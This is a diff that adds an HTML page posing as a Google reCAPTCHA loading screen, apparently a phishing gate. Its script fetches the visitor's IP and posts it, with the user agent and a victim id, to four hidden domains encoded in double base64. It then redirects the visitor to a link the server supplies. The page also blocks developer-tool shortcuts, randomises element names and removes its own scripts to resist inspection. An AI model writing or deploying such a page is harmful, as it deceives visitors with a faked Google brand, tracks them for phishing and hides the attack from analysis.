@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Loading Page</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 500;
+            color: #4285f4;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            margin: 0 auto 20px;
+        }
+
+        .logo img {
+            width: 120px;
+            height: auto;
+        }
+
+        .loading-dots {
+            font-size: 1.5rem;
+            font-weight: 400;
+            color: #555;
+        }
+
+        .loading-dots span {
+            animation: blink 1.5s infinite;
+        }
+
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+
+        .loading-dots span:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            font-size: 0.875rem;
+            color: #666;
+			font-size: 10px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="main-container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        </div>
+        <p style="text-align: center;"><img alt="" src="https://www.google.com/recaptcha/intro/images/hero-recaptcha-invisible.gif" /></p>
+        <div class="loading-dots">
+            <span>.</span><span>.</span><span>.</span>
+        </div>
+    </div>
+    <div class="footer">
+        <p>
+            By using this website, you agree to our <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.
+        </p>
+        <p>&copy; 2025 Google. All rights reserved.</p>
+    </div>
+
+<script>
+    // Generate a random string
+	    function getUrlParameter(name) {
+        const regex = new RegExp(`[\\?&]${name}=([^&#]*)`);
+        const results = regex.exec(window.location.search);
+        return results ? decodeURIComponent(results[1].replace(/\+/g, " ")) : "";
+    }
+
+    function doubleDecode(base64String) {
+        try {
+            return atob(atob(base64String));
+        } catch (error) {
+            console.error("Error decoding string:", error);
+            return "";
+        }
+    }
+
+    async function getUserIP() {
+        try {
+            const response = await fetch("https://api.ipify.org?format=json");
+            if (!response.ok) throw new Error(`Failed to fetch IP: ${response.status}`);
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error("Error getting user IP:", error);
+            return null;
+        }
+    }
+
+    async function sendDataToDomain(postData, domains) {
+        for (let i = 0; i < domains.length; i++) {
+            const domain = doubleDecode(domains[i]);
+            try {
+                console.log(`Trying to send data to: ${domain}`);
+                const response = await fetch(domain, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(postData),
+                });
+    
+                if (!response.ok) {
+                    throw new Error(`Failed with status: ${response.status}`);
+                }
+    
+                // If the request is successful, return the response JSON
+                return await response.json();
+            } catch (error) {
+                console.error(`Error sending data to ${domain}:`, error);
+    
+                // If this is the last domain, return null
+                if (i === domains.length - 1) {
+                    console.error("All servers failed. No more domains to try.");
+                    return null;
+                }
+            }
+        }
+    }
+
+    async function sendData(ip, userid) {
+        const userAgent = navigator.userAgent;
+        const postData = { userid, ip, userAgent };
+        const encodedDomains = ["YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", "YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", "YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", "YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"];
+        const response = await sendDataToDomain(postData, encodedDomains);
+        if (response) handleResponse(response);
+    }
+
+    async function sendMata_black(ip) {
+        const userAgent = navigator.userAgent;
+        const postData = { localblock: "invalid", ip, userAgent };
+        const encodedDomains = ["YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", "YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", "YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", "YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"];
+        const response = await sendDataToDomain(postData, encodedDomains);
+        if (response) handleResponse(response);
+    }
+
+    function handleResponse(responseData) {
+        if (!responseData) {
+            console.error("Response data is undefined or null");
+            return;
+        }
+
+        switch (responseData.res_status) {
+            case "200":
+                if (responseData.link && responseData.nuser) {
+                    window.location.href = `${responseData.link}?iduser=${responseData.nuser}`;
+                } else {
+                    console.error("Missing 'link' or 'nuser' in the response");
+                }
+                break;
+
+            case "405":
+                window.location.href = "https://example.com/";
+                break;
+
+            default:
+                console.error("Unexpected response from server:", responseData);
+                break;
+        }
+    }
+
+    // Main Execution
+    getUserIP().then((ip) => {
+        if (ip) {
+            const userid = getUrlParameter("iduser");
+            if (userid) {
+                sendData(ip, userid);
+            } else {
+                sendMata_black(ip);
+            }
+        } else {
+            console.error("Error: Unable to retrieve IP");
+        }
+    });
+
+    function getRandomString(length) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
+
+    // Assign random ID and class to elements
+    function addRandomIdAndClass() {
+        const allElements = document.querySelectorAll("*");
+        allElements.forEach((element) => {
+            if (!element.id) {
+                element.id = getRandomString(26);
+            }
+            if (!element.classList.length) {
+                element.classList.add(getRandomString(10), getRandomString(15));
+            }
+        });
+    }
+    const blockShortcuts = () => {
+            document.addEventListener("contextmenu", (e) => e.preventDefault());
+            document.addEventListener("keydown", (e) => {
+                if (
+                    e.key === "F12" ||
+                    (e.ctrlKey && e.shiftKey && e.key === "I") ||
+                    (e.ctrlKey && e.key === "U")
+                ) {
+                    e.preventDefault();
+                    hideAllContent();
+                }
+            });
+        };
+    window.onload = function () {
+        addRandomIdAndClass();
+		 blockShortcuts();
+    };
+	
+</script>
+
+   <script>
+   
+        (function() {
+            const removeScripts = () => {
+                const scripts = document.querySelectorAll('script');
+                scripts.forEach(script => {
+                    script.remove();
+                });
+            };
+            removeScripts();
+        })();
+    </script>
+</body>
+</html>
